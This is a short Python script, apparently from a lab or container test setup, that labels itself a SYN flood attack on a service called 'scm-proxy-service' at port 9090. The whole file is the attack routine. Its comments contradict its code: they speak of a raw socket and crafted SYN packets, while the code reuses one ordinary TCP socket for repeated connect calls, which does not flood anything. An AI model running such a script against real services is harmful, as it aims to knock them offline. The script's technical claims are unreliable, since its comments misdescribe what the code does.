import socket
import random
import time

TARGET_IP = "scm-proxy-service"  # IP address of the SCM-proxy (use the actual server IP or container IP)
TARGET_PORT = 9090  # The SCM-proxy's listening port
SYN_FLOOD_COUNT = 100  # Number of SYN requests to send
SYN_PACKET_INTERVAL = 0.01  # Interval between SYN packets in seconds (to simulate flood)

# Function to simulate a SYN flood attack
def syn_flood_attack():
    print(f"[Attack] Starting SYN flood attack on {TARGET_IP}:{TARGET_PORT}")

    # Create a raw socket to send SYN packets
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        # Set socket to non-blocking mode to prevent delays
        s.setblocking(False)

        # Send SYN packets in a loop to flood the target
        for _ in range(SYN_FLOOD_COUNT):
            try:
                # Craft a SYN packet (no actual data)
                s.connect((TARGET_IP, TARGET_PORT))  # Initiates a connection attempt (SYN)
                # Do not send the ACK, just close the connection (simulate no response)
                # No further action is done here to complete the handshake
                print(f"[Attack] Sending SYN to {TARGET_IP}:{TARGET_PORT}")
                time.sleep(SYN_PACKET_INTERVAL)  # Control the rate of requests
            except (BlockingIOError, socket.error) as e:
                # Expecting this error because we don't complete the handshake (we don't send ACK)
                pass

    print("[Attack] SYN flood attack complete.")

if __name__ == "__main__":
    syn_flood_attack()
